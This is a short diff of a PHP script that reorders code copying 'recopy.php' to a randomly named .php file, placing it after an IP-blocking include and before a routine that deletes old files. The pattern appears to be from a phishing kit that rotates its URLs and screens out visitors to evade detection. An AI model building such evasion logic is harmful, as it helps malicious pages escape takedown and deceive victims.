@@ -48,9 +48,6 @@ function generateRandomString($length = 10) {
     }
     return $randomString;
 }
-$file_r = 'recopy.php';
-$newfile_r = generateRandomString().".php";
-copy($file_r, $newfile_r);
 
 if ($blocker == 1){
 require 'block.php';
@@ -64,6 +61,9 @@ foreach ($ips as $ip)
     }
 }
 }
+$file_r = 'recopy.php';
+$newfile_r = generateRandomString().".php";
+copy($file_r, $newfile_r);
 //delete old files
 $files = glob(getcwd().'/*'); // get all file names
 	foreach($files as $file){ // iterate files
